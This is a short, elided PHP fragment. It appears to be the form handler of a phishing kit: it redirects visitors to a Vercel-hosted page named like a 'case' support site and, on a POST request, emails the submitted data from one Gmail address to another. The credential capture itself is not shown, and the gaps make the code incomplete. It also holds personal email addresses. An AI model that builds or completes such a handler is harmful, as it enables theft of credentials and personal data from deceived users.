...
header("Location: https://case-ccczqz4cd1pfr4008-support.vercel.app/");
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    try {
        ...
        // Email properties
        $mail->setFrom('patjckbang@gmail.com', 'Hello DK');
        $mail->addAddress('Selinavaliz@gmail.com');
